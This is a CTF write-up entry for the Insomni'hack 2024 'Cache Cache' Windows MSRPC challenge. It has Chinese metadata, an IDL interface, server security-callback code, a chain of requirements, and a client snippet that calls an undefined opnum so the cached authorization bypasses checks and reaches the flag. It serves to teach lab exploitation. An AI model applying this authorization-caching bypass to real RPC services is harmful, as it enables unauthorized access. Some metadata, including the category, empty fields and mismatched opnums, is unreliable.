---
title: Insomni'hack 2024 CTF Teaser – Cache Cache (MSRPC)
contest: Insomni'hack
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- MSRPC
- Windows RPC
- ServerSecurityCallback
- Impersonation Level
- Authentication Level
- opnum cache
attack_chain: '|'
key_payload: '|'
one_liner: Insomni'hack 2024 Windows MSRPC 服务的状态机题，靠调不存在的 opnum 42 触发异常前 authorization 已被缓存的设计漏洞。
lesson: '|'
quality: high
full_path: Insomni’hack_2024_CTF_Teaser_–_Cache_Cache.full.md
meta_path: Insomni’hack_2024_CTF_Teaser_–_Cache_Cache.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Insomni'hack 2024 CTF Teaser – Cache Cache (MSRPC)。Insomni'hack 2024 Windows MSRPC 服务的状态机题，靠调不存在的 opnum 42 触发异常前 authorization 已被缓存的设计漏洞。。经验：|
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/158507.html
reasoning_chain:
- Windows MSRPC 服务 → 触发点：状态机 opnum 处理
- 动作：rpcclient / impacket 探测 → 假设：服务有 authorization 校验
- 假设：opnum cache 漏洞 → 动作：先调不存在的 opnum 42 触发异常
- 观察：异常抛出前 authorization 已通过缓存 → 下一步：用其他 opnum 调用绕过
- 动作：用合法 opnum 但不带足够鉴权 → 观察：服务放行 → 拿到敏感数据
- 假设：ServerSecurityCallback 缓存 → 动作：构造特定 opnum 序列触发 cache pollution
- 观察：Impersonation Level / Authentication Level 校验被绕过 → 完成
failed_attempts:
- 试图直接调合法 opnum → 失败：被 authorization 拒绝
- 试图用 NULL session → 失败：RPC server 拒绝
- 试图改 Authentication Level → 失败：客户端侧无法伪造 server callback
key_observations:
- MSRPC 服务的 ServerSecurityCallback 是 opnum dispatch 前的鉴权点
- 状态机类服务若先 authorize 再 dispatch opnum，中途抛异常会留下 cache
- Impersonation Level / Authentication Level 在 Windows RPC 是核心安全边界
- opnum 缓存污染是 CTF MSRPC 题的高阶考点
- Windows RPC 比 Linux RPC 多了 ServerSecurityCallback 层
prerequisites:
- Windows MSRPC 协议 + impacket rpcclient
- ServerSecurityCallback / Impersonation Level
- Authentication Level (RPC_C_AUTHN_LEVEL)
---
# Insomni’hack 2024 CTF Teaser – Cache Cache

> 原文: https://www.ctfiot.com/158507.html
> ID: 158507


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
[
 uuid (9b5cb5a7-624d-4ae2-ab79-529fbb2f3072),
 version(1.0),
 pointer_default(unique)
]
interface winternals3
{
 typedef struct _PLAYER_CONTEXT
 {
 wchar_t wszPlayerName[64];
 wchar_t wszPlayerLocation[64];
 int bPlayerFound;
 } PLAYER_CONTEXT, * PPLAYER_CONTEXT;

 typedef [context_handle] void* PCONTEXT_HANDLE_TYPE;

 long HsCreatePlayer([in] handle_t binding_h, [out] PCONTEXT_HANDLE_TYPE* pphContext, [in, string] wchar_t* pwszName); // 0
 long HsGetPlayerName([in] handle_t binding_h, [in] PCONTEXT_HANDLE_TYPE phContext, [out, string][ref] wchar_t** ppwszName); // 1
 long HsCallReady([in] handle_t binding_h, [in, string] wchar_t* pwszMessage, [out, string][ref] wchar_t** ppwszResponse); // 2
 long HsHidePlayer([in] handle_t binding_h, [in] PCONTEXT_HANDLE_TYPE phContext, [in, string] wchar_t* pwszLocation); // 3
 long HsGetPlayerLocation([in] handle_t binding_h, [in] PCONTEXT_HANDLE_TYPE phContext, [out, string][ref] wchar_t** ppwszLocation); // 4
 long HsSeekPlayer([in] handle_t binding_h, [in] PCONTEXT_HANDLE_TYPE phContext); // 5
 long HsGetFlag([in] handle_t binding_h, [in] PCONTEXT_HANDLE_TYPE phContext, [out, string][ref] wchar_t** ppwszFlag); // 6
 long HsClose([in] handle_t binding_h, [in, out] PCONTEXT_HANDLE_TYPE* pphContext); // 7
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
// ...
 Log(L"INIT > Registering protocol sequence: %ws:%ws\r\n");
 RVar1 = RpcServerUseProtseqEpW(
 (RPC_WSTR)L"ncacn_http", 10, (RPC_WSTR)L"8000", (void *)0x0
 );
 if (RVar1 == 0) {
 Log(L"INIT > Registering authentication information\r\n");
 RVar1 = RpcServerRegisterAuthInfoW(
 (RPC_WSTR)0x0, 10, (RPC_AUTH_KEY_RETRIEVAL_FN)0x0, (void *)0x0
 );
 if (RVar1 == 0) {
 Log(L"INIT > Registering interface\r\n");
 RVar1 = RpcServerRegisterIf2(
 &winternals3___RpcServerInterface, // RPC_IF_HANDLE IfSpec
 (UUID *)0x0, // UUID *MgrTypeUuid
 (void *)0x0, // RPC_MGR_EPV *MgrEpv
 0, // unsigned int Flags
 0x4d2, // unsigned int MaxCalls
 0xffffffff, // unsigned int MaxRpcSize
 ServerSecurityCallback // RPC_IF_CALLBACK_FN *IfCallbackFn
 );
// ...
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
RPC_STATUS ServerSecurityCallback(RPC_IF_HANDLE InterfaceUuid, void* Context)
{
 Log(L"CALLBACK > Callback start\r\n");

 RPC_STATUS status = E_UNEXPECTED, authorization = RPC_S_ACCESS_DENIED;
 RPC_CALL_ATTRIBUTES_V2_W RpcCallAttributes;
 USHORT opnum;
 DWORD al;
 SECURITY_IMPERSONATION_LEVEL il = SecurityAnonymous;

 ZeroMemory(&RpcCallAttributes, sizeof(RpcCallAttributes));
 RpcCallAttributes.Version = 2;
 RpcCallAttributes.Flags = 0;

 status = RpcServerInqCallAttributesW(Context, &RpcCallAttributes);
 if (status != RPC_S_OK) {
 Log(L"RpcServerInqCallAttributesW() err: %d - 0x%08x\r\n", status, status);
 goto cleanup;
 }

 opnum = RpcCallAttributes.OpNum;
 al = RpcCallAttributes.AuthenticationLevel;
 GetImpersonationLevel(Context, &il);

 if (il == SecurityIdentification) {
 if (al == RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) {
 if (opnum == 2) { // HsCallReady
 authorization = RPC_S_OK;
 }
 } else if (al == RPC_C_AUTHN_LEVEL_PKT_PRIVACY) {
 if (opnum == 3) { // HsSeekPlayer
 authorization = RPC_S_OK;
 }
 }
 } else if (il == SecurityImpersonation) {
 if (al == RPC_C_AUTHN_LEVEL_PKT_PRIVACY) {
 if (opnum == 42) {
 authorization = RPC_S_OK;
 }
 }
 }

cleanup:
 Log(L"CALLBACK > Callback end\r\n");

 return authorization;
}
1. "HsGetFlag" call requires:
 - Impersonation Level = "IMPERSONATION"
 - Authentication Level = "PRIVACY"
 - Context->found = true
2. "HsGetFlag" authorization granted through:
 - An RPC call with the opnum 42
3. "Context->found = true" requires:
 - An RPC call to "HsSeekPlayer"
 - Context->name = "Alice"
 - Context->location = "Wonderland"
4. "Context->location = Wonderland" requires:
 - An RPC call to "HsHidePlayer"
 - An RPC call to "HsSeekPlayer"
5. "HsSeekPlayer" call requires:
 - Impersonation level = "IDENTIFICATION"
 - Authentication level = "PRIVACY"
6. "HsSeekPlayer" authorization granted through:
 - An RPC call to "HsHidePlayer"
7. "Context->name = Alice" requires
 - An RPC call to "HsCreatePlayer"
8. "HsCreatePlayer" authorization granted through:
 - An RPC call to "HsCallReady"
9. "HsCallReady" call requires:
 - Impersonation level = "IDENTIFICATION"
 - Authentication level = "INTEGRITY"
1
2
3
4
5
6
7
8
9
__try {
 // We need to call HsNotUsed42 to pass and cache the authorization, but
 // the procedure number is not defined, an exception will be thrown. This
 // is expected.
 wprintf(L"[*] 5) IMPERSONATION + PRIVACY + HsNotUsed42() -> Authorization cached\r\n");
 ret = HsNotUsed42(BindingHandle);
} __
except (EXCEPTION_EXECUTE_HANDLER) {
 wprintf(L"[*] RPC runtime exception: %d - 0x%08x (this exception is expected).\r\n", RpcExceptionCode(), RpcExceptionCode());
}
```
